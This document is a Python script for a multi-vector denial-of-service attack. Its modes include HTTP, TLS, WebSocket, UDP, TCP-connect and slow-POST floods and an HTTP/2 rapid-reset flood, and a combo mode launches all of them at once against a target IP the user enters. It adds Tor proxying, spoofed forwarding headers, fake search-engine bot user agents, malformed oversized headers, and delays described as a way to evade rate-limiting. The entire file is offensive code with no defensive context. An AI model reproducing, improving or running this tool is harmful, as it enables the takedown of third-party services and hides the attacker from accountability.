#!/usr/bin/env python3
import os
import socket, threading, random, time, sys, ssl
import socks  # PySocks for Tor support
import ipaddress

try:
    from scapy.all import IP, UDP, send, Raw
except ImportError:
    print("⚠️ Scapy not installed. Run: pip3 install scapy --user")
    sys.exit(1)

try:
    import httpx
    from h2.connection import H2Connection
    from h2.events import StreamReset, ConnectionTerminated
except ImportError:
    print("⚠️ httpx or h2 not installed. Run: pip3 install httpx\\[http2\\] --user")
    sys.exit(1)

USE_TOR = False
MAX_CONNECTIONS_PER_THREAD = 3  # Number of HTTP/2 connections per thread

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1)",
    "curl/7.64.1",
    "Wget/1.20.3",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
]

STEALTH_HEADERS = [
    "X-Forwarded-For", "Referer", "Origin", "Cache-Control", "X-Real-IP"
]

def stealth_http_headers(malformed=False):
    large_cookie = f"sessionid={os.urandom(16).hex()}; " + \
                   "; ".join(f"param{i}={os.urandom(random.randint(50, 100)).hex()}" for i in range(5)) + \
                   "; token=" + os.urandom(32).hex()
    
    headers = {
        ":method": "GET",
        ":path": f"/?q={random.randint(1000,9999)}",
        ":scheme": "https",
        ":authority": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "user-agent": random.choice(USER_AGENTS),
        "accept-language": random.choice([
            "en-US,en;q=0.9", "es-ES,es;q=0.8", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9"
        ]),
        "referer": f"https://{random.choice(['google.com', 'bing.com', 'yahoo.com', 'duckduckgo.com'])}/search?q={random.randint(1000,9999)}",
        "x-forwarded-for": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "cookie": large_cookie,
        "connection": "keep-alive",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache",
        "pragma": "no-cache"
    }
    
    if malformed:
        headers[":invalid-header"] = os.urandom(1024).hex()  # Invalid pseudo-header
        headers["x-oversized"] = "A" * 8192  # Oversized header to trigger server reset
    return headers

def get_socket():
    if USE_TOR:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    return s

def http_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = get_socket()
                s.connect((ip, port))
                uri = f"/?q={random.randint(1000,9999)}"
                req = f"GET {uri} HTTP/1.1\r\nHost: {ip}\r\n" + ''.join(f"{k}: {v}\r\n" for k, v in stealth_http_headers().items()) + "\r\n"
                s.send(req.encode())
                s.close()
            except: pass
    run_threads(attack, threads, duration, "HTTP Flood")

def tls_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                context = ssl.create_default_context()
                s = get_socket()
                s = context.wrap_socket(s, server_hostname=ip)
                s.connect((ip, port))
                s.close()
            except: pass
    run_threads(attack, threads, duration, "TLS Handshake Flood")

def head_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = get_socket()
                s.connect((ip, port))
                req = f"HEAD / HTTP/1.1\r\nHost: {ip}\r\n" + ''.join(f"{k}: {v}\r\n" for k, v in stealth_http_headers().items()) + "\r\n"
                s.send(req.encode())
                s.close()
            except: pass
    run_threads(attack, threads, duration, "HEAD Request Flood")

def ws_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = get_socket()
                s.connect((ip, port))
                req = (
                    f"GET /chat HTTP/1.1\r\nHost: {ip}\r\nUpgrade: websocket\r\n"
                    f"Connection: Upgrade\r\nSec-WebSocket-Key: {random.randbytes(16).hex()}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n" + ''.join(f"{k}: {v}\r\n" for k, v in stealth_http_headers().items()) + "\r\n"
                )
                s.send(req.encode())
                time.sleep(1.5)
                s.close()
            except: pass
    run_threads(attack, threads, duration, "WebSocket Flood")

def udp_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        payload = random._urandom(1024)
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, port))
            except: pass
    run_threads(attack, threads, duration, "UDP Flood")

def tcp_syn_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket()
                s.connect((ip, port))
                s.close()
            except: pass
    run_threads(attack, threads, duration, "TCP SYN Flood")

def slow_post_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        payload = "X" * 1024
        while time.time() < end:
            try:
                s = get_socket()
                s.connect((ip, port))
                s.send(f"POST / HTTP/1.1\r\nHost: {ip}\r\nContent-Length: {len(payload)*100}\r\n".encode())
                for _ in range(100):
                    s.send((payload + "\r\n").encode())
                    time.sleep(0.3)
                s.close()
            except: pass
    run_threads(attack, threads, duration, "Slow POST (RUDY)")

def http2_flood(ip, port, duration, threads):
    def get_max_concurrent_streams(h2_conn):
        try:
            return h2_conn.remote_settings.max_concurrent_streams
        except:
            return 100

    def attack():
        end = time.time() + duration
        connections = []

        def create_connection():
            try:
                context = ssl.create_default_context()
                context.set_alpn_protocols(['h2'])
                s = get_socket()
                s = context.wrap_socket(s, server_hostname=ip)
                s.connect((ip, port))
                client = httpx.Client(http2=True, verify=context)
                h2_conn = H2Connection()
                h2_conn.initiate_connection()
                s.sendall(h2_conn.data_to_send())
                return client, h2_conn, s
            except:
                return None, None, None

        for _ in range(MAX_CONNECTIONS_PER_THREAD):
            client, h2_conn, s = create_connection()
            if client and h2_conn and s:
                connections.append((client, h2_conn, s))

        if not connections:
            return

        max_concurrent_streams = min(get_max_concurrent_streams(connections[0][1]), 100)
        stream_ids = {h2_conn: 1 for _, h2_conn, _ in connections}

        while time.time() < end:
            for i, (client, h2_conn, s) in enumerate(connections[:]):
                try:
                    active_streams = 0
                    while active_streams < max_concurrent_streams and time.time() < end:
                        try:
                            stream_id = stream_ids[h2_conn]
                            tactic = random.choice(["client_reset", "malformed_frame", "flow_control_error"])
                            
                            if tactic == "client_reset":
                                headers = stealth_http_headers(malformed=False)
                                h2_conn.send_headers(stream_id, headers, end_stream=False)
                                h2_conn.send_data(stream_id, b"", end_stream=True)
                                h2_conn.reset_stream(stream_id, error_code=0x8)  # CANCEL
                                s.sendall(h2_conn.data_to_send())
                            elif tactic == "malformed_frame":
                                headers = stealth_http_headers(malformed=True)
                                h2_conn.send_headers(stream_id, headers, end_stream=False)
                                s.sendall(h2_conn.data_to_send())
                            elif tactic == "flow_control_error":
                                headers = stealth_http_headers(malformed=False)
                                h2_conn.send_headers(stream_id, headers, end_stream=False)
                                h2_conn.send_data(stream_id, os.urandom(16384), end_stream=False)
                                s.sendall(h2_conn.data_to_send())

                            stream_ids[h2_conn] += 2
                            active_streams += 1
                            time.sleep(random.uniform(0.005, 0.05))  # Random delay to evade rate-limiting

                            # Check for server responses (e.g., GOAWAY)
                            data = s.recv(65535)
                            if data:
                                events = h2_conn.receive_data(data)
                                for event in events:
                                    if isinstance(event, ConnectionTerminated):
                                        try:
                                            s.close()
                                            client.close()
                                        except:
                                            pass
                                        connections.pop(i)
                                        client, h2_conn, s = create_connection()
                                        if client and h2_conn and s:
                                            connections.append((client, h2_conn, s))
                                            stream_ids[h2_conn] = 1
                                        break
                                    elif isinstance(event, StreamReset):
                                        stream_ids[h2_conn] += 2
                                        active_streams += 1
                        except (httpx.HTTPError, socket.error):
                            break
                except:
                    try:
                        s.close()
                        client.close()
                    except:
                        pass
                    connections.pop(i)
                    client, h2_conn, s = create_connection()
                    if client and h2_conn and s:
                        connections.append((client, h2_conn, s))
                        stream_ids[h2_conn] = 1
        for client, h2_conn, s in connections:
            try:
                s.close()
                client.close()
            except:
                pass

    run_threads(attack, threads, duration, "HTTP/2 Rapid-Reset Flood")

def combo_flood(ip, port, duration, threads):
    print(f"[🔥] Launching COMBO mode: all floods simultaneously...")
    flood_funcs = [
        http_flood, tls_flood, head_flood, ws_flood,
        udp_flood, tcp_syn_flood, slow_post_flood, http2_flood
    ]
    for func in flood_funcs:
        threading.Thread(target=func, args=(ip, port, duration, threads), daemon=True).start()
    time.sleep(duration)
    print("[✓] Combo flood complete.\n")

def run_threads(attack_func, threads, duration, label):
    print(f"[~] Starting {label} for {duration}s with {threads} threads...")
    for _ in range(threads):
        t = threading.Thread(target=attack_func)
        t.daemon = True
        t.start()
    time.sleep(duration)
    print(f"[✓] {label} complete.\n")

def parse_trigger(args):
    modes = ["http", "tls", "head", "ws", "udp", "tcp", "slowpost", "http2", "combo"]

    if len(args) < 6:
        print("No command-line arguments provided. Entering interactive mode.")
        print("Please provide the following information:")

        # Prompt for IP address
        while True:
            ip = input("Target IP address: ").strip()
            try:
                ipaddress.ip_address(ip)
                break
            except ValueError:
                print("Invalid IP address. Please enter a valid IPv4 or IPv6 address.")

        # Prompt for port
        while True:
            port_str = input("Target port (e.g., 80 for HTTP, 443 for HTTPS): ").strip()
            try:
                port = int(port_str)
                if 1 <= port <= 65535:
                    break
                else:
                    print("Port must be between 1 and 65535.")
            except ValueError:
                print("Invalid port. Please enter a numeric value.")

        # Prompt for duration
        while True:
            duration_str = input("Duration in seconds (e.g., 60): ").strip()
            try:
                duration = int(duration_str)
                if duration > 0:
                    break
                else:
                    print("Duration must be a positive number.")
            except ValueError:
                print("Invalid duration. Please enter a numeric value.")

        # Prompt for threads
        while True:
            threads_str = input("Number of threads (e.g., 10): ").strip()
            try:
                threads = int(threads_str)
                if threads > 0:
                    break
                else:
                    print("Threads must be a positive number.")
            except ValueError:
                print("Invalid threads. Please enter a numeric value.")

        # Prompt for mode
        while True:
            print(f"Available modes: {', '.join(modes)}")
            mode = input("Mode: ").strip().lower()
            if mode in modes:
                break
            print("Invalid mode. Please choose one of the available modes.")

        # Prompt for loop
        while True:
            loop_str = input("Enable loop mode? (y/n): ").strip().lower()
            if loop_str in ['y', 'n']:
                loop = loop_str == 'y'
                break
            print("Please enter 'y' for yes or 'n' for no.")
    else:
        if len(args) < 6:
            print("Usage: python3 http2_rapid_reset.py <ip> <port> <duration> <threads> <mode> [--loop]")
            print(f"Modes: {', '.join(modes)}")
            sys.exit(1)

        _, ip, port, duration, threads, mode, *flags = args
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            print("Invalid IP address.")
            sys.exit(1)
        try:
            port = int(port)
            if not 1 <= port <= 65535:
                print("Port must be between 1 and 65535.")
                sys.exit(1)
        except ValueError:
            print("Invalid port. Please enter a numeric value.")
            sys.exit(1)
        try:
            duration = int(duration)
            if duration <= 0:
                print("Duration must be a positive number.")
                sys.exit(1)
        except ValueError:
            print("Invalid duration. Please enter a numeric value.")
            sys.exit(1)
        try:
            threads = int(threads)
            if threads <= 0:
                print("Threads must be a positive number.")
                sys.exit(1)
        except ValueError:
            print("Invalid threads. Please enter a numeric value.")
            sys.exit(1)
        mode = mode.lower()
        if mode not in modes:
            print(f"Invalid mode. Choose from: {', '.join(modes)}")
            sys.exit(1)
        loop = "--loop" in flags

    print(f"[✓] Mode: {mode.upper()} | Target: {ip}:{port} | Threads: {threads} | Duration: {duration}s")

    if loop:
        print("[∞] Loop mode: ON. Press Ctrl+C to stop.\n")
        try:
            while True:
                run_mode(mode, ip, port, duration, threads)
        except KeyboardInterrupt:
            print("\n[✘] Loop stopped by user.")
    else:
        run_mode(mode, ip, port, duration, threads)

def run_mode(mode, ip, port, duration, threads):
    if mode == "http":
        http_flood(ip, port, duration, threads)
    elif mode == "tls":
        tls_flood(ip, port, duration, threads)
    elif mode == "head":
        head_flood(ip, port, duration, threads)
    elif mode == "ws":
        ws_flood(ip, port, duration, threads)
    elif mode == "udp":
        udp_flood(ip, port, duration, threads)
    elif mode == "tcp":
        tcp_syn_flood(ip, port, duration, threads)
    elif mode == "slowpost":
        slow_post_flood(ip, port, duration, threads)
    elif mode == "http2":
        http2_flood(ip, port, duration, threads)
    elif mode == "combo":
        combo_flood(ip, port, duration, threads)
    else:
        print("Invalid mode.")

if __name__ == "__main__":
    parse_trigger(sys.argv)
